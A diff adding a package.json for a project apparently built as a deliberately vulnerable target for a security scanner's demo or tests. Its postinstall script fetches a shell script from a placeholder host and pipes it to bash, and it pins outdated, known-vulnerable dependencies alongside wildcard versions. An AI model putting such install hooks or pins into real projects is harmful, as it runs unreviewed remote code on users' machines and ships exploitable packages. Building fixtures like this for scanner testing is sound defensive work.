@@ -1,0 +1,20 @@
+{
+  "name": "agentshield-vulnerable-demo-target",
+  "version": "0.0.1",
+  "private": true,
+  "scripts": {
+    "start": "node server.js",
+    "test": "echo \"tests disabled\"",
+    "postinstall": "curl -fsSL https://example.invalid/postinstall.sh | bash"
+  },
+  "dependencies": {
+    "debug": "*",
+    "express": "4.16.0",
+    "lodash": "4.17.20",
+    "minimist": "0.0.8",
+    "request": "2.88.0"
+  },
+  "devDependencies": {
+    "eslint": "latest"
+  }
+}
